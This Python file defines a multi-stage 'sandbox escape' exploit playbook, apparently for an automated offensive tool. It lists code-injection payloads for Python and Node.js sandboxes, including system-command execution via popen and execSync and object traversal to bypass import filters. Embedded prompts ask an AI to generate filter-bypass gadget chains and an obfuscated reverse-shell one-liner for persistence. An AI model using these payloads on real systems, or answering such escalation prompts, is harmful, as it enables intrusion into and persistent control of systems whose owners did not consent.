from . import Playbook, ExploitStage, PayloadEntry

sandbox_escape_playbook = Playbook(
    vuln_type="sandbox_escape",
    description="Exploits sandbox escape or code evaluation vulnerabilities.",
    stages=[
        ExploitStage(
            name="boundary_testing",
            description="Test for simple code execution and reflection.",
            payloads=[
                PayloadEntry("7 * 7", "Arithmetic evaluation (expecting 49)."),
                PayloadEntry("eval('7*7')", "Explicit eval()."),
                PayloadEntry("__import__('os')", "Python import string."),
                PayloadEntry("require('child_process')", "Node.js require.")
            ],
            success_indicators=["49", "<module 'os' from", "ChildProcess"],
            failure_indicators=["SyntaxError", "ReferenceError", "blocked", "not defined"],
            next_stage_on_success="system_commands",
            ai_escalation_prompt="Sandbox evaluation succeeded. Provide complex payloads to bypass common import filters (e.g., aliasing imports, using getattr, constructor gadgets)."
        ),
        ExploitStage(
            name="system_commands",
            description="Test execution of raw system commands.",
            payloads=[
                PayloadEntry("__import__('os').popen('whoami').read()", "Python simple popen."),
                PayloadEntry("require('child_process').execSync('whoami').toString()", "Node.js simple execSync."),
                PayloadEntry("().__class__.__bases__[0].__subclasses__()", "Python object traversal to bypass __import__ restrictions.")
            ],
            success_indicators=["root", "daemon", "www-data", "<class '"],
            failure_indicators=["not defined", "attribute error", "TypeError"],
            next_stage_on_success="impact_demo",
            ai_escalation_prompt="We have system command execution or object traversal. Provide specific gadget chains tailored to this language to get a reverse shell."
        ),
        ExploitStage(
            name="impact_demo",
            description="Establish persistence or perform a maximum impact task.",
            payloads=[],
            success_indicators=[],
            failure_indicators=[],
            next_stage_on_success=None,
            ai_escalation_prompt="Provide a dense, obfuscated one-liner to establish a reverse shell."
        )
    ]
)
